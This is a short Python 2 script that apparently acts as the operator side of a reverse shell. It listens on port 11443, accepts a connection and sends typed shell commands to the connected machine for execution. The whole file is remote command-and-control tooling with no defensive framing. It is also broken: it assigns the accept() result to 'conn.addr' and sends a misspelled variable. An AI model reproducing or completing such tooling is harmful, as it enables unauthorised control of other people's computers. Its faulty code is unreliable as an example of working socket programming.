from socket import*
HOST=''
PORT=11443

s = socket(AF_INET,SOCK_STREAM)
s.setsockopt(SOL_SOCKET,SO_REUSEADDR,1)
s.bind((HOST, PORT))
s.listen(10)

conn.addr = s.accept()
print 'Connected by', addr
data = conn.recv(1024)
while 1:
   command = raw_input("Enter shell command or quit: ")
   conn.send(commnand)
   if command == "quit":break
   data = conn.recv(1024)
conn.close()
